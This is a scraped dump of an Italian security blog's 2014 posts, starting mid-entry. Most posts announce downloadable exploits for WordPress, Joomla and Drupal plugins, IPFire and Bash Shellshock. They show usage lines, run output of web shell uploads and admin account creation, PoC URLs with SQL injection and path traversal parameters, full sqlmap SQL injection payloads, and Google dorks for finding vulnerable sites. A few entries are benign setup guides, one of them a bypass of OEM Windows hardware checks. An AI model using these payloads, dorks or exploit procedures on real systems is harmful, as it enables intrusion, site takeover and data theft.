httplib2.ServerNotFoundError:\rprint(\u0026#39;\\n[X] Server Not Found\u0026#39;)\rsys.exit(1)\rexcept httplib2.HttpLib2Error:\rprint(\u0026#39;\\n[X] Connection Error!!\u0026#39;)\rsys.exit(1) Esecuzione claudio@linux-vm:~$ python wordpress_login.py WordPress Authentication with Python\r[!] Logged\r[!] Username: pippo Password: pippo\rclaudio@linux-vm:~$ ","permalink":"https://www.homelab.it/index.php/2014/11/02/wordpress-e-python-come-autenticarsi/","summary":"Intro Dopo aver pubblicato vari exploit e vulnerabilità, sono tornato a scrivere un articolo dove poter condividere piccole nozioni tecniche che ho acquisito recentemente.\nNegli ultimi mesi mi sono dedicato soprattutto ad analizzare codici php di vari plugins wordpress e alla programmazione in python.\nDato che molte vulnerabilità dei plugins wordpress richiedevano un utente (privilegiato e non) con accesso all’area riservata ho pensato: perché non scrivere gli exploit in python per automatizzare il tutto?","title":"WordPress e Python: Come autenticarsi al famoso CMS con python"},{"content":"claudio@backbox3:~$ python j00m_com_rd_download_sql_injection.py -t http://127.0.0.1\r_______ __ | _ .-----.-----.--------| .---.-. |___| | _ | _ | | | _ | |. | |_____|_____|__|__|__|__|___._| |: 1 | |::.. . | `-------\u0026#39; _______ ______ ______ __ __ | _ | _ \\ | _ \\ .-----.--.--.--.-----| .-----.---.-.--| |\r|. l |. | \\ |. | \\| _ | | | | | | _ | _ | _ |\r|. _ |. | \\ |. | |_____|________|__|__|__|_____|___._|_____|\r|: | |: 1 / |: 1 / |::.|:. |::.. . / |::.. . / `--- ---`------\u0026#39; `------\u0026#39; J00ml4 RD D0wnl04d Sql1nj3ct10n\rWritten by:\rClaudio Viviani\rhttp://www.homelab.it\rinfo@homelab.it\rhomelabit@protonmail.ch\rhttps://www.facebook.com/homelabit\rhttps://twitter.com/homelabit\rhttps://plus.google.com/+HomelabIt1/\rhttps://www.youtube.com/channel/UCqqmSdMqf_exicCe_DjlBww\r[*] Trying to connect to: http://127.0.0.1/index.php?option=com_rd_download\u0026amp;view=download\u0026amp;task=dl\u0026amp;id=[SQLi]\r[!] VULNERABLE\r[*] Username: j00mUser@%\rclaudio@backbox3:~$ Info # Exploit Name: Joomla RD Download SQL Injection\r#\r# Version: Unknown Download Download Exploit: HERE\nExploit Usage  claudio@backbox3:~$ python j00m_com_rd_download_sql_injection.py -t http[s]://localhost[:PORT]\ror\rclaudio@backbox3:~$ python j00m_com_rd_download_sql_injection.py -t http[s]://localhost[:PORT]/basedir ","permalink":"https://www.homelab.it/index.php/2014/10/29/joomla-rd-download-sql-injection/","summary":"claudio@backbox3:~$ python j00m_com_rd_download_sql_injection.py -t http://127.0.0.1\r_______ __ | _ .-----.-----.--------| .---.-. |___| | _ | _ | | | _ | |. | |_____|_____|__|__|__|__|___._| |: 1 | |::.. . | `-------\u0026#39; _______ ______ ______ __ __ | _ | _ \\ | _ \\ .-----.--.--.--.-----| .-----.---.-.--| |\r|. l |. | \\ |. | \\| _ | | | | | | _ | _ | _ |\r|. _ |.","title":"Joomla RD Download Sql Injection"},{"content":"claudio@backbox3:~$ python wp_j00m_creative_contact_form_shell_upload.py -t http://127.0.0.1/wordpress -f shell.php -c wordpress\r___ ___ __ __,-,__ | Y .-----.----.--| .-----.----.-----.-----. | \u0026#39; \u0026#39;__| |. | | _ | _| _ | _ | _| -__|__ --| | __| |. / \\ |_____|__| |_____| __|__| |_____|_____| |_______| |: | _______ |__| __ |_| |::.|:. | | _ .-----.-----.--------| .---.-. `--- ---\u0026#39; |___| | _ | _ | | | _ | |. | |_____|_____|__|__|__|__|___._| |: 1 | |::.. . | `-------\u0026#39; _______ __ __ _______ __ __\r| _ .----.-----.---.-| |_|__.--.--.-----. | _ .-----.-----| |_.---.-.----| |_ |. 1___| _| -__| _ | _| | | | -__| |. 1___| _ | | _| _ | __| _| |. |___|__| |_____|___._|____|__|\\___/|_____| |. |___|_____|__|__|____|___._|____|____| |: 1 | _______ |: 1 | |::.. . | | _ .-----.----.--------. |::.. . | `-------\u0026#39; |. 1___| _ | _| | `-------\u0026#39; |. __) |_____|__| |__|__|__| |: | |::.| `---\u0026#39; Cr3ative C0nt4ct Form Sh3ll Upl04d\rDiscovered by:\rGianni Angelozzi\rWritten by:\rClaudio Viviani\rhttp://www.homelab.it\rinfo@homelab.it\rhomelabit@protonmail.ch\rhttps://www.facebook.com/homelabit\rhttps://twitter.com/homelabit\rhttps://plus.google.com/+HomelabIt1/\rhttps://www.youtube.com/channel/UCqqmSdMqf_exicCe_DjlBww\r[!] Shell Uploaded\r[!] http://127.0.0.1/wordpress/wp-content/plugins/sexy-contact-form/includes/fileupload/files/shell.php Info # Exploit Name: WordPress and Joomla Creative Contact Form Shell Upload Vulnerability\r# WordPress plugin version: \u0026lt;= 0.9.7\r# Joomla extension version: \u0026lt;= 2.0.0    Download Download Exploit: HERE\nExploit Usage WordPress:\rclaudio@backbox3:~$ python wp_j00m_creative_contact_form_shell_upload.py -t http[s]://localhost[:PORT] -f shell.php -c wordpress\ror\rclaudio@backbox3:~$ python wp_j00m_creative_contact_form_shell_upload.py -t http[s]://localhost[:PORT]/basedir -f shell.php -c wordpress\rJoomla:\rclaudio@backbox3:~$ python wp_j00m_creative_contact_form_shell_upload.py -t http[s]://localhost[:PORT] -f shell.php -c joomla\ror\rclaudio@backbox3:~$ python wp_j00m_creative_contact_form_shell_upload.py -t http[s]://localhost[:PORT]/basedir -f shell.php -c joomla ","permalink":"https://www.homelab.it/index.php/2014/10/24/creative-contact-form-unauthenticated-shell-upload/","summary":"claudio@backbox3:~$ python wp_j00m_creative_contact_form_shell_upload.py -t http://127.0.0.1/wordpress -f shell.php -c wordpress\r___ ___ __ __,-,__ | Y .-----.----.--| .-----.----.-----.-----. | \u0026#39; \u0026#39;__| |. | | _ | _| _ | _ | _| -__|__ --| | __| |. / \\ |_____|__| |_____| __|__| |_____|_____| |_______| |: | _______ |__| __ |_| |::.|:. | | _ .-----.-----.--------| .---.-. `--- ---\u0026#39; |___| | _ | _ | | | _ | |. | |_____|_____|__|__|__|__|___._| |: 1 | |::.","title":"WordPress and Joomla Creative Contact Form Unauthenticated Shell Upload Vulnerability"},{"content":"######################\r# Exploit Title : WordPress CP Multi View Event Calendar 1.01 SQL Injection Vulnerability\r# Exploit Author : Claudio Viviani # Software Link : https://downloads.wordpress.org/plugin/cp-multi-view-calendar.zip\r# Date : 2014-10-23\r# Tested on : Windows 7 / Mozilla Firefox\rWindows 7 / sqlmap (0.8-1)\rLinux / Mozilla Firefox\rLinux / sqlmap 1.0-dev-5b2ded0\r######################\r# Description\rCP Multi View Event Calendar 1.01 suffers from SQL injection vulnerability\rcalid variable is not sanitized.\r######################\r# PoC\rhttp://localhost/?cpmvc_id=1\u0026amp;cpmvc_do_action=mvparse\u0026amp;f=datafeed\u0026amp;method=list\u0026amp;calid=1 [Sqli]\r# Sqlmap\r---\rPlace: GET\rParameter: calid\rType: boolean-based blind\rTitle: MySQL boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (RLIKE)\rPayload: cpmvc_id=1\u0026amp;cpmvc_do_action=mvparse\u0026amp;f=datafeed\u0026amp;method=list\u0026amp;calid=1 RLIKE (SELECT (CASE WHEN (9095=9095) THEN 1 ELSE 0x28 END))\rType: error-based\rTitle: MySQL \u0026gt;= 5.0 AND error-based - WHERE or HAVING clause\rPayload: cpmvc_id=1\u0026amp;cpmvc_do_action=mvparse\u0026amp;f=datafeed\u0026amp;method=list\u0026amp;calid=1 AND (SELECT 3807 FROM(SELECT COUNT(*),CONCAT(0x7171736971,(SELECT (CASE WHEN (3807=3807) THEN 1 ELSE 0 END)),0x716b716671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)\rType: UNION query\rTitle: MySQL UNION query (NULL) - 14 columns\rPayload: cpmvc_id=1\u0026amp;cpmvc_do_action=mvparse\u0026amp;f=datafeed\u0026amp;method=list\u0026amp;calid=1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x7171736971,0x6f7642724e6743615973,0x716b716671),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#\rType: AND/OR time-based blind\rTitle: MySQL \u0026lt; 5.0.12 AND time-based blind (heavy query)\rPayload: cpmvc_id=1\u0026amp;cpmvc_do_action=mvparse\u0026amp;f=datafeed\u0026amp;method=list\u0026amp;calid=1 AND 8168=BENCHMARK(5000000,MD5(0x4a4a6d41))\r---\r#####################\rDiscovered By : Claudio Viviani\rhttp://www.homelab.it\rinfo@homelab.it\rhomelabit@protonmail.ch\rhttps://www.facebook.com/homelabit\rhttps://twitter.com/homelabit\rhttps://plus.google.com/+HomelabIt1/\rhttps://www.youtube.com/channel/UCqqmSdMqf_exicCe_DjlBww\r##################### ","permalink":"https://www.homelab.it/index.php/2014/10/23/wordpress-cp-multi-view-event-calendar-1-01-sql-injection/","summary":"######################\r# Exploit Title : WordPress CP Multi View Event Calendar 1.01 SQL Injection Vulnerability\r# Exploit Author : Claudio Viviani # Software Link : https://downloads.wordpress.org/plugin/cp-multi-view-calendar.zip\r# Date : 2014-10-23\r# Tested on : Windows 7 / Mozilla Firefox\rWindows 7 / sqlmap (0.8-1)\rLinux / Mozilla Firefox\rLinux / sqlmap 1.0-dev-5b2ded0\r######################\r# Description\rCP Multi View Event Calendar 1.01 suffers from SQL injection vulnerability\rcalid variable is not sanitized.","title":"WordPress CP Multi View Event Calendar 1.01 Sql Injection"},{"content":"claudio@backbox3:~$ ./drupal.py -t http://127.0.0.1/drupal -u 4dm1n -p p4ssw0rd\r______ __ _______ _______ _____ | _ \\ .----.--.--.-----.---.-| | | _ || _ | _ | |. | \\| _| | | _ | _ | | |___| _|___| |.| | |. | |__| |_____| __|___._|__| / |___(__ `-|. | |: 1 / |__| | | |: 1 | |: | |::.. . / | | |::.. . | |::.| `------\u0026#39; `---\u0026#39; `-------\u0026#39; `---\u0026#39; _______ __ ___ __ __ __ | _ .-----| | | .-----|__.-----.----| |_|__.-----.-----.\r| 1___| _ | | |. | | | -__| __| _| | _ | |\r|____ |__ |__| |. |__|__| |_____|____|____|__|_____|__|__|\r|: 1 | |__| |: | |___| |::.. . | |::.| `-------\u0026#39; `---\u0026#39; Drup4l =\u0026gt; 7.0 \u0026lt;= 7.31 Sql-1nj3ct10n\rAdmin 4cc0unt cr3at0r\rDiscovered by:\rStefan Horst\r(CVE-2014-3704)\rWritten by:\rClaudio Viviani\rhttp://www.homelab.it\rinfo@homelab.it\rhomelabit@protonmail.ch\rhttps://www.facebook.com/homelabit\rhttps://twitter.com/homelabit\rhttps://plus.google.com/+HomelabIt1/\rhttps://www.youtube.com/channel/UCqqmSdMqf_exicCe_DjlBww\r[!] VULNERABLE!\r[!] Administrator user created!\r[*] Login: 4dm1n\r[*] Pass: p4ssw0rd\r[*] Url: http://127.0.0.1/drupal/?q=node\u0026amp;destination=node Info This exploit add a new Drupal administrator account (preserving original) via Sql Injection.\nDownload Download Exploit: HERE\n","permalink":"https://www.homelab.it/index.php/2014/10/17/drupal-7-sql-injection/","summary":"claudio@backbox3:~$ ./drupal.py -t http://127.0.0.1/drupal -u 4dm1n -p p4ssw0rd\r______ __ _______ _______ _____ | _ \\ .----.--.--.-----.---.-| | | _ || _ | _ | |. | \\| _| | | _ | _ | | |___| _|___| |.| | |. | |__| |_____| __|___._|__| / |___(__ `-|. | |: 1 / |__| | | |: 1 | |: | |::.. . / | | |::.. . | |::.| `------\u0026#39; `---\u0026#39; `-------\u0026#39; `---\u0026#39; _______ __ ___ __ __ __ | _ .","title":"Drupal 7 Sql Injection SA-CORE-2014-005 CVE-2014-3704"},{"content":"Tested on:\nFaraday Community Edition\nBackBox Linux 3.x x86_64\n Download Faraday   claudio@backbox3:~$ wget https://github.com/infobyte/faraday/archive/master.zip Install requirements   claudio@backbox3:~$ sudo pip install psycopg2\rDownloading/unpacking psycopg2\rRunning setup.py egg_info for package psycopg2\rInstalling collected packages: psycopg2\rRunning setup.py install for psycopg2\rSuccessfully installed psycopg2\rCleaning up...\rclaudio@backbox3:~$ Modify installation script   claudio@backbox3:~$ unzip master.zip\rclaudio@backbox3:~$ cd faraday-master/\rclaudio@backbox3:~/faraday-master$ ls\rapis AUTHORS config data deps exporters faraday.py gui install.sh model plugins RELEASE.md scripts test_cases utils zsh auth bin controllers default.keytab doc external faraday-terminal.zsh __init__.py managers persistence README.md requirements.txt shell updates views Edit file “install.sh” from:\nif [ \u0026#34;$os\u0026#34; = \u0026#34;Ubuntu 10.04.2 LTS\u0026#34; ]; then\rversion=\u0026#34;ubuntu10-04.02$arch\u0026#34;\relif [[ \u0026#34;$os\u0026#34; =~ .*Kali.* ]]; then\rversion=\u0026#34;kali-$arch\u0026#34;\rdown=1\relif [ \u0026#34;$os\u0026#34; = \u0026#34;Ubuntu 12.04.3 LTS\u0026#34; ]; then\rversion=\u0026#34;ubuntu12-$arch\u0026#34;\relif [ \u0026#34;$os\u0026#34; = \u0026#34;Ubuntu 13.10\u0026#34; ]; then\rversion=\u0026#34;ubuntu13-10-$arch\u0026#34;\rdown=1\relif [ \u0026#34;$os\u0026#34; = \u0026#34;Ubuntu 13.04\u0026#34; ]; then\rversion=\u0026#34;ubuntu13-04-$arch\u0026#34;\rdown=1\relse\recho \u0026#34;[-] Could not find a install for $os ($arch $kernel)\u0026#34;\rexit\rfi to:\necho \u0026#34;[+] Install $os $arch\u0026#34;\rdown=0\rif [ \u0026#34;$os\u0026#34; = \u0026#34;Ubuntu 10.04.2 LTS\u0026#34; ]; then\rversion=\u0026#34;ubuntu10-04.02$arch\u0026#34;\relif [[ \u0026#34;$os\u0026#34; =~ .*Kali.* ]]; then\rversion=\u0026#34;kali-$arch\u0026#34;\rdown=1\relif [ \u0026#34;$os\u0026#34; = \u0026#34;Ubuntu 12.04.3 LTS\u0026#34; ]; then\rversion=\u0026#34;ubuntu12-$arch\u0026#34;\relif [ \u0026#34;$os\u0026#34; = \u0026#34;Ubuntu 12.04.5 LTS\u0026#34; ]; then\rversion=\u0026#34;ubuntu12-$arch\u0026#34;\relif [ \u0026#34;$os\u0026#34; = \u0026#34;Ubuntu 13.10\u0026#34; ]; then\rversion=\u0026#34;ubuntu13-10-$arch\u0026#34;\rdown=1\relif [ \u0026#34;$os\u0026#34; = \u0026#34;Ubuntu 13.04\u0026#34; ]; then\rversion=\u0026#34;ubuntu13-04-$arch\u0026#34;\rdown=1\relse\recho \u0026#34;[-] Could not find a install for $os ($arch $kernel)\u0026#34;\rexit\rfi Run Setup   claudio@backbox3:~/faraday-master$ sudo ./install.sh\r[+] Install Ubuntu 12.04.5 LTS x86_64\rReading package lists... Done\rBuilding dependency tree Reading state information... Done\rpython-qt3 is already the newest version.\rThe following packages were automatically installed and are no longer required:\rlibboost-date-time1.46.1 liborcus-0.6-0 libcmis-0.3-3\rUse \u0026#39;apt-get autoremove\u0026#39; to remove them.\r0 upgraded, 0 newly installed, 0 to remove and 2 not upgraded.\rReading package lists... Done\rBuilding dependency tree Reading state information... Done\r....\r....\r.....\rYou can now run Faraday, enjoy! ","permalink":"https://www.homelab.it/index.php/2014/10/11/how-to-install-faraday-on-backbox-linux-3/","summary":"Tested on:\nFaraday Community Edition\nBackBox Linux 3.x x86_64\n Download Faraday   claudio@backbox3:~$ wget https://github.com/infobyte/faraday/archive/master.zip Install requirements   claudio@backbox3:~$ sudo pip install psycopg2\rDownloading/unpacking psycopg2\rRunning setup.py egg_info for package psycopg2\rInstalling collected packages: psycopg2\rRunning setup.py install for psycopg2\rSuccessfully installed psycopg2\rCleaning up...\rclaudio@backbox3:~$ Modify installation script   claudio@backbox3:~$ unzip master.zip\rclaudio@backbox3:~$ cd faraday-master/\rclaudio@backbox3:~/faraday-master$ ls\rapis AUTHORS config data deps exporters faraday.py gui install.","title":"How to install Faraday Community Edition on BackBox Linux 3"},{"content":"Avete un server HP, Dell o IBM con VMware ESXi e volete installare una macchina virtuale windows utilizzando il relativo CD OEM?\nAvete già effettuato un tentativo ma vi siete imbattuti in questo tipo d’errore?\nBene, anzi male, ma vi trovate nella pagina giusta per risolvere il problema.\nQuesti supporti con sistemi windows OEM sono predisposti di controlli in modo da poter essere eseguiti solo su hardware specifico.\nPer aggirare queste protezioni basta inserire una particolare opzione all’interno della configurazione della macchina virtuale.\nConfigurazione macchina virtuale Nonostante l’ovvietà ci tengo a precisare che le seguenti modifiche dovranno essere eseguite a macchina virtuale spenta.\n1) Editare le opzioni della macchina virtuale interessata\n2) Cliccare sul menu Options, poi General, e Configuration Parameters.\n3) Cliccare il bottone Add Row e compilare i campi Name e Value nel seguente modo:\nName: SMBIOS.reflectHost\nValue: TRUE\n4) Dopo aver confermato le modifiche è possibile fare partire l’installazione.\nTengo a precisare che questa procedura funziona soltanto utilizzando installazioni oem con hardware del relativo brand,\nquindi Windows OEM HP su server HP, Windows OEM Dell su server Dell, Windows OEM IBM su server IBM e così via.\n","permalink":"https://www.homelab.it/index.php/2014/10/04/come-installare-windows-oem-vmware-esxi/","summary":"Avete un server HP, Dell o IBM con VMware ESXi e volete installare una macchina virtuale windows utilizzando il relativo CD OEM?\nAvete già effettuato un tentativo ma vi siete imbattuti in questo tipo d’errore?\nBene, anzi male, ma vi trovate nella pagina giusta per risolvere il problema.\nQuesti supporti con sistemi windows OEM sono predisposti di controlli in modo da poter essere eseguiti solo su hardware specifico.\nPer aggirare queste protezioni basta inserire una particolare opzione all’interno della configurazione della macchina virtuale.","title":"Come installare Windows OEM su VMware ESXi"},{"content":"[claudio@localhost ~]$ python ipfire_cgi_shellshock.py\r___ _______ _______ __ _______ __\r| | _ | _ |__.----.-----. | _ .-----|__|\r|. |. 1 |. 1___| | _| -__| |. 1___| _ | |\r|. |. ____|. __) |__|__| |_____| |. |___|___ |__|\r|: |: | |: | |: 1 |_____|\r|::.|::.| |::.| |::.. . |\r`---`---\u0026#39; `---\u0026#39; `-------\u0026#39;\r_______ __ __ __ _______ __ __\r| _ | |--.-----| | | _ | |--.-----.----| |--.\r| 1___| | -__| | | 1___| | _ | __| \u0026lt;\r|____ |__|__|_____|__|__|____ |__|__|_____|____|__|__|\r|: 1 | |: 1 |\r|::.. . | |::.. . |\r`-------\u0026#39; `-------\u0026#39;\rIPFire \u0026lt;= 2.15 c0re 82 Authenticated\rCgi Sh3llSh0ck r3m0t3 C0mm4nd Inj3ct10n\rWritten by:\rClaudio Viviani\rhttp://www.homelab.it\rinfo@homelab.it\rhomelabit@protonmail.ch\rhttps://www.facebook.com/homelabit\rhttps://twitter.com/homelabit\rhttps://plus.google.com/+HomelabIt1/\rhttps://www.youtube.com/channel/UCqqmSdMqf_exicCe_DjlBww\rusage: ipfire_cgi_shellshock.py -t https://target:444/ -u admin -p pwd -c \u0026#34;touch /tmp/test.txt\u0026#34;\roptions:\r-h, --help show this help message and exit\r-t TARGET, --target=TARGET\rInsert TARGET URL\r-c CMD, --cmd=CMD Insert command name\r-u USER, --user=USER Insert username\r-p PWD, --pwd=PWD Insert password Download Download Exploit: HERE\n","permalink":"https://www.homelab.it/index.php/2014/09/29/ipfire-cgi-web-interface-authenticated-bash-environment-variable-code-injection-exploit/","summary":"[claudio@localhost ~]$ python ipfire_cgi_shellshock.py\r___ _______ _______ __ _______ __\r| | _ | _ |__.----.-----. | _ .-----|__|\r|. |. 1 |. 1___| | _| -__| |. 1___| _ | |\r|. |. ____|. __) |__|__| |_____| |. |___|___ |__|\r|: |: | |: | |: 1 |_____|\r|::.|::.| |::.| |::.. . |\r`---`---\u0026#39; `---\u0026#39; `-------\u0026#39;\r_______ __ __ __ _______ __ __\r| _ | |--.-----| | | _ | |--.","title":"IPFire Cgi Web Interface Authenticated Bash Environment Variable Code Injection exploit"},{"content":"[claudio@localhost ~]$ ./bash_env_rci_v2.py\r_______ _______ __\r| _ .-----.--.--. | _ .---.-.-----| |--.\r|. |___| | | | |. 1 | _ |__ --| |\r|. | |__|__|_____| |. _ |___._|_____|__|__|\r|: 1 | |: 1 \\\r|::.. . | |::.. . /\r`-------\u0026#39; `-------\u0026#39;\r___ ___ _______ _______ _______ ___\r| Y | | _ | | _ | _ | |\r| | |_|___| | |. l |. 1___|. |\r|____ |___(__ | |. _ |. |___|. |\r|: | |: 1 | |: | |: 1 |: |\r|::.| |::.. . | |::.|:. |::.. . |::.|\r`---\u0026#39; `-------\u0026#39; `--- ---`-------`---\u0026#39;\rGnu B4sh \u0026lt;= 4.3 Cg1 Sc4n + r3m0t3 C0mm4nd Inj3ct10n\r==========================================\r- Release date: 2014-09-25\r- Discovered by: Stephane Chazelas\r- CVE: 2014-6271\r===========================================\rWritten by:\rClaudio Viviani\rhttp://www.homelab.it\rinfo@homelab.it\rhomelabit@protonmail.ch\rhttps://www.facebook.com/homelabit\rhttps://twitter.com/homelabit\rhttps://plus.google.com/+HomelabIt1/\rhttps://www.youtube.com/channel/UCqqmSdMqf_exicCe_DjlBww\rusage: bash_env_rci_v2.py [-s] -t http://localhost/cgi-bin/test -c \u0026#34;touch /tmp/test.txt\u0026#34;\roptions:\r-h, --help show this help message and exit\r-t TARGET, --target=TARGET\rInsert TARGET URL: http[s]://www.victim.com[:PORT]\r-c CMD, --cmd=CMD Insert command name\r-s, --scan Scan Only Download Download Exploit: HERE\nVideo   ","permalink":"https://www.homelab.it/index.php/2014/09/26/gnu-bash-4-3-and-below-remote-command-injection-exploit/","summary":"[claudio@localhost ~]$ ./bash_env_rci_v2.py\r_______ _______ __\r| _ .-----.--.--. | _ .---.-.-----| |--.\r|. |___| | | | |. 1 | _ |__ --| |\r|. | |__|__|_____| |. _ |___._|_____|__|__|\r|: 1 | |: 1 \\\r|::.. . | |::.. . /\r`-------\u0026#39; `-------\u0026#39;\r___ ___ _______ _______ _______ ___\r| Y | | _ | | _ | _ | |\r| | |_|___| | |. l |. 1___|.","title":"Gnu Bash 4.3 and below Cgi Scan + Remote Command Injection Exploit"},{"content":"######################\r# Exploit Title : Joomla Face Gallery 1.0 Multiple Vulnerabilities\r# Exploit Author : Claudio Viviani\r# Vendor Homepage : https://www.apptha.com\r# Software Link : https://www.apptha.com/downloadable/download/sample/sample_id/150\r# Dork Google: inurl:option=com_facegallery\r# Date : 2014-09-17\r# Tested on : Windows 7 / Mozilla Firefox\r# Linux / Mozilla Firefox\r# Info:\r# Joomla Face Gallery 1.0 suffers from SQL injection and Arbitrary file download vulnerabilities\r# PoC Exploit:\r#\r# http://localhost/index.php?option=com_facegallery\u0026amp;view=images\u0026amp;aid=[SQLi]\u0026amp;lang=en\r# http://localhost/index.php?option=com_facegallery\u0026amp;task=imageDownload\u0026amp;img_name=[../../filename]\r# \u0026#34;aid\u0026#34; and \u0026#34;img_name\u0026#34; variables are not sanitized.\r######################\rDiscovered By : Claudio Viviani\rhttp://www.homelab.it\rinfo@homelab.it\rhomelabit@protonmail.ch\rhttps://www.facebook.com/homelabit\rhttps://twitter.com/homelabit\rhttps://plus.google.com/+HomelabIt1/\rhttps://www.youtube.com/channel/UCqqmSdMqf_exicCe_DjlBww\r##################### Download Download Exploit: HERE\nExploit Usage python j00ml4_face_gallery_10_afd.py -t http[s]://localhost[:PORT]\rpython j00ml4_face_gallery_10_afd.py -t http[s]://localhost/basedir[:PORT] ","permalink":"https://www.homelab.it/index.php/2014/09/22/joomla-face-gallery-1-0-multiple-vulnerabilities/","summary":"######################\r# Exploit Title : Joomla Face Gallery 1.0 Multiple Vulnerabilities\r# Exploit Author : Claudio Viviani\r# Vendor Homepage : https://www.apptha.com\r# Software Link : https://www.apptha.com/downloadable/download/sample/sample_id/150\r# Dork Google: inurl:option=com_facegallery\r# Date : 2014-09-17\r# Tested on : Windows 7 / Mozilla Firefox\r# Linux / Mozilla Firefox\r# Info:\r# Joomla Face Gallery 1.0 suffers from SQL injection and Arbitrary file download vulnerabilities\r# PoC Exploit:\r#\r# http://localhost/index.","title":"Joomla Face Gallery 1.0 Multiple Vulnerabilities"},{"content":"######################\r# Exploit Title : Joomla Mac Gallery \u0026lt;= 1.5 Arbitrary File Download\r# Exploit Author : Claudio Viviani\r# Vendor Homepage : https://www.apptha.com\r# Software Link : https://www.apptha.com/downloadable/download/sample/sample_id/18\r# Dork Google: inurl:option=com_macgallery\r# Date : 2014-09-17\r# Tested on : Windows 7 / Mozilla Firefox\r# Linux / Mozilla Firefox\r# Info:\r# Joomla Mac Gallery suffers from Arbitrary File Download vulnerability\r# PoC Exploit:\r# http://localhost/index.php?option=com_macgallery\u0026amp;view=download\u0026amp;albumid=[../../filename]\r# \u0026#34;album_id\u0026#34; variable is not sanitized.\r######################\rDiscovered By : Claudio Viviani\rhttp://www.homelab.it\rinfo@homelab.it\rhomelabit@protonmail.ch\rhttps://www.facebook.com/homelabit\rhttps://twitter.com/homelabit\rhttps://plus.google.com/+HomelabIt1/\rhttps://www.youtube.com/channel/UCqqmSdMqf_exicCe_DjlBww\r##################### Download Download Exploit: HERE\nExploit Usage python j00ml4_mac_gallery_15_afd.py -t http[s]://localhost[:PORT]\rpython j00ml4_mac_gallery_15_afd.py -t http[s]://localhost/basedir[:PORT] ","permalink":"https://www.homelab.it/index.php/2014/09/21/joomla-mac-gallery-1-5-and-below-arbitrary-file-download-vulnerability/","summary":"######################\r# Exploit Title : Joomla Mac Gallery \u0026lt;= 1.5 Arbitrary File Download\r# Exploit Author : Claudio Viviani\r# Vendor Homepage : https://www.apptha.com\r# Software Link : https://www.apptha.com/downloadable/download/sample/sample_id/18\r# Dork Google: inurl:option=com_macgallery\r# Date : 2014-09-17\r# Tested on : Windows 7 / Mozilla Firefox\r# Linux / Mozilla Firefox\r# Info:\r# Joomla Mac Gallery suffers from Arbitrary File Download vulnerability\r# PoC Exploit:\r# http://localhost/index.php?option=com_macgallery\u0026amp;view=download\u0026amp;albumid=[../../filename]\r# \u0026#34;album_id\u0026#34; variable is not sanitized.","title":"Joomla Mac Gallery 1.5 and below Arbitrary File Download vulnerability"},{"content":"[claudio@localhost ~]$ python wp_gallery_slideshow_146_suv.py -t http://localhost/wordpress -u editor -p editor -f sh33l.php\r$$$$$$\\ $$\\ $$\\ $$\\ $$\\\r$$ __$$\\ $$ |\\__| $$ | $$ |\r$$ / \\__|$$ |$$\\ $$$$$$$ | $$$$$$\\ $$$$$$$\\ $$$$$$$\\ $$$$$$\\ $$\\ $$\\ $$\\\r\\$$$$$$\\ $$ |$$ |$$ __$$ |$$ __$$\\ $$ _____|$$ __$$\\ $$ __$$\\ $$ | $$ | $$ |\r\\____$$\\ $$ |$$ |$$ / $$ |$$$$$$$$ |\\$$$$$$\\ $$ | $$ |$$ / $$ |$$ | $$ | $$ |\r$$\\ $$ |$$ |$$ |$$ | $$ |$$ ____| \\____$$\\ $$ | $$ |$$ | $$ |$$ | $$ | $$ |\r\\$$$$$$ |$$ |$$ |\\$$$$$$$ |\\$$$$$$$\\ $$$$$$$ |$$ | $$ |\\$$$$$$ |\\$$$$$\\$$$$ |\r\\______/ \\__|\\__| \\_______| \\_______|\\_______/ \\__| \\__| \\______/ \\_____\\____/\r$$$$$$\\ $$\\ $$\\ $$\\ $$\\ $$\\ $$$$$$\\\r$$ __$$\\ $$ |$$ | $$$$ |$$ | $$ | $$ __$$\\\r$$ / \\__| $$$$$$\\ $$ |$$ | $$$$$$\\ $$$$$$\\ $$\\ $$\\ \\_$$ |$$ | $$ | $$ / \\__|\r$$ |$$$$\\ \\____$$\\ $$ |$$ |$$ __$$\\ $$ __$$\\ $$ | $$ | $$ |$$$$$$$$ | $$$$$$$\\\r$$ |\\_$$ | $$$$$$$ |$$ |$$ |$$$$$$$$ |$$ | \\__|$$ | $$ | $$ |\\_____$$ | $$ __$$\\\r$$ | $$ |$$ __$$ |$$ |$$ |$$ ____|$$ | $$ | $$ | $$ | $$ | $$ / $$ |\r\\$$$$$$ |\\$$$$$$$ |$$ |$$ |\\$$$$$$$\\ $$ | \\$$$$$$$ | $$$$$$\\ $$\\ $$ |$$\\ $$$$$$ |\r\\______/ \\_______|\\__|\\__| \\_______|\\__| \\____$$ | \\______|\\__|\\__|\\__|\\______/\r$$\\ $$ |\r\\$$$$$$ |\r\\______/\rW0rdpr3ss Sl1d3sh04w G4ll3ry 1.4.6 Sh3ll Upl04d Vuln.\r=============================================\r- Release date: 2014-08-28\r- Discovered by: Jesus Ramirez Pichardo\r- CVE: 2014-5460\r=============================================\rWritten by:\rClaudio Viviani\rhttp://www.homelab.it\rinfo@homelab.it\rhomelabit@protonmail.ch\rhttps://www.facebook.com/homelabit\rhttps://twitter.com/homelabit\rhttps://plus.google.com/+HomelabIt1/\rhttps://www.youtube.com/channel/UCqqmSdMqf_exicCe_DjlBww\r[+] Username \u0026amp; password ACCEPTED!\r[!] Shell Uploaded!\r[+] Check url: http://localhost/wordpress/wp-content/uploads/slideshow-gallery/sh33l.php (lowercase!!!!) Exploit Usage python wp_gallery_slideshow_146_suv.py -t http[s]://localhost -u user -p pwd -f sh33l.php\rpython wp_gallery_slideshow_146_suv.py -t http[s]://localhost/dir -u user -p pwd -f sh33l.php\rpython wp_gallery_slideshow_146_suv.py -t http[s]://localhost:80|443 -u user -p pwd -f sh33l.php Download Download Exploit: HERE\nInfo # WordPress Slideshow Gallery 1.4.6 Shell Upload Exploit\r# WordPress Slideshow Gallery plugin version 1.4.6 suffers from a remote shell upload vulnerability (CVE-2014-5460)\r# Vulnerability discovered by: Jesus Ramirez Pichardo - http://whitexploit.blogspot.mx/\r# Exploit written by: Claudio Viviani - info@homelab.it - http://www.homelab.it\r# Info:\r# Any user could upload php files (administrator by default)\r# Disclaimer:\r# This exploit is intended for educational purposes only and the author\r# can not be held liable for any kind of damages done whatsoever to your machine,\r# or damages caused by some other,creative application of this exploit.\r# In any case you disagree with the above statement,stop 